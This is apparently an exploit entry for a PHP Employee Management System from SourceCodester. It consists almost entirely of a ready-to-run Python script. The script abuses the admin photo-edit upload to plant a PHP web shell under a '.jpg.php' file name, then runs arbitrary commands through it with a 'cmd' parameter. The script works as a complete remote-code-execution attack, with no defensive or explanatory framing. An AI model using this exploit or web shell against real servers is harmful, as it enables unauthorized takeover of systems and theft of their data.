### Vendor Homepage:

# https://www.sourcecodester.com

### Software Link:

# [Employee Management System](https://www.sourcecodester.com/php/16999/employee-management-system.html)

import requests
import sys
import argparse
import random
import string
from urllib.parse import urlparse, urljoin

def random_filename(base="shellexec", ext=".jpg.php"):
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{base}{random_str}{ext}"

def format_url(base_url, endpoint):
    if not base_url.endswith('/'):
        base_url += '/'
    return urljoin(base_url, endpoint)

def send_post_request(base_url, filename, proxies):
    post_url = format_url(base_url, 'Admin/edit-photo.php')

    boundary = "---------------------------296946627421322280062813742794"
    headers = {
        'Host': urlparse(base_url).hostname,
        'Content-Type': f'multipart/form-data; boundary={boundary}',
    }

    data = f"--{boundary}\r\n"
    data += f'Content-Disposition: form-data; name="avatar"; filename="{filename}"\r\n'
    data += "Content-Type: image/jpeg\r\n\r\n"
    data += "<?php system($_GET['cmd']); ?>\r\n"
    data += f"--{boundary}\r\n"
    data += 'Content-Disposition: form-data; name="btnsave"\r\n\r\n'
    data += "\r\n"
    data += f"--{boundary}--\r\n"

    response = requests.post(post_url, headers=headers, data=data.encode(), verify=False, proxies=proxies)
    
    return response.ok

def send_get_request(base_url, filename, command, proxies):
    get_url = format_url(base_url, f'uploadImage/{filename}')
    params = {'cmd': command}

    headers = {
        'Host': urlparse(base_url).hostname,
    }

    response = requests.get(get_url, headers=headers, params=params, verify=False, proxies=proxies)
    print(response.text)

def main():
    parser = argparse.ArgumentParser(description='Send requests to a specified URL.')
    parser.add_argument('-u', '--url', type=str, required=True, help='Base URL to send the requests to')
    parser.add_argument('-c', '--command', type=str, required=True, help='Command to be executed')

    args = parser.parse_args()

    filename = random_filename()
    full_path = format_url(args.url, f'uploadImage/{filename}')

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    if send_post_request(args.url, filename, proxies):
        print(f"File uploaded successfully: {filename}")
        print(f"Full path: {full_path}?cmd={args.command}")
        send_get_request(args.url, filename, args.command, proxies)
    else:
        print("Failed to upload the file.")

if __name__ == "__main__":
    main()
